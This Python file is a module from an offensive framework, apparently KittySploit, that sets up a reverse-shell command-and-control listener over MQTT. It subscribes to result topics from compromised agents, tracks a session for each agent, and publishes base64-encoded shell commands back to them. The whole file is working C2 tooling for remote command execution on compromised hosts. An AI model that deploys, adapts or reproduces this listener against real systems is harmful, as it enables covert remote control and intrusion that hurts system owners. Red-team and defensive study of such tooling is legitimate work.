#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import time

from kittysploit import *


class Module(Listener):
    __info__ = {
        "name": "Reverse MQTT Shell Listener",
        "description": "Command/result C2 over MQTT topics, separate from the generic MQTT pub/sub listener.",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "mqtt_reverse_shell",
        "dependencies": ["paho-mqtt"],
    }

    host = OptString("127.0.0.1", "MQTT broker host", True)
    port = OptPort(1883, "MQTT broker port", True)
    username = OptString("", "Broker username", False)
    password = OptString("", "Broker password", False)
    base_topic = OptString("kittysploit/c2", "Base topic", True)
    client_id = OptString("kitty-controller", "Controller MQTT client ID", False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.client = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}

    def _ensure_session(self, client_id, client_ip="mqtt"):
        if client_id in self._client_id_to_session:
            return self._client_id_to_session[client_id]
        data = {
            "protocol": "mqtt_reverse_shell",
            "client_id": client_id,
            "client_ip": client_ip,
            "base_topic": str(self.base_topic),
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "reverse_mqtt_shell",
        }
        sid = self._create_session("reverse", client_ip, int(self.port), data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._received_output[sid] = []
            print_success(f"MQTT reverse agent {client_id} -> session {sid}")
        return sid

    def _on_message(self, client, userdata, msg):
        try:
            parts = msg.topic.split("/")
            client_id = parts[-2] if len(parts) >= 2 else "agent"
            payload = msg.payload.decode("utf-8", errors="replace")
            try:
                data = json.loads(payload)
                output = data.get("output", payload)
                if data.get("encoding") == "base64":
                    output = base64.b64decode(output).decode("utf-8", errors="replace")
            except Exception:
                output = payload
            sid = self._ensure_session(client_id, "mqtt")
            self._append_output(sid, output)
        except Exception:
            pass

    def run(self, background=False):
        try:
            import paho.mqtt.client as mqtt
        except ImportError:
            print_error("paho-mqtt is required")
            return False
        self.client = mqtt.Client(client_id=str(self.client_id or ""), protocol=mqtt.MQTTv311)
        if str(self.username or "").strip():
            self.client.username_pw_set(str(self.username), str(self.password or ""))
        self.client.on_message = self._on_message
        self.client.connect(str(self.host), int(self.port), keepalive=60)
        topic = f"{str(self.base_topic).rstrip('/')}/+/result"
        self.client.subscribe(topic)
        self.client.loop_start()
        self.running = True
        print_success(f"Reverse MQTT shell listener subscribed to {topic}")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd):
        client_id = self._session_to_client_id.get(session_id)
        if not client_id or not self.client:
            return
        payload = json.dumps({"command": base64.b64encode(cmd.encode()).decode(), "encoding": "base64"})
        self.client.publish(f"{str(self.base_topic).rstrip('/')}/{client_id}/cmd", payload)

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.client:
            self.client.loop_stop()
            self.client.disconnect()

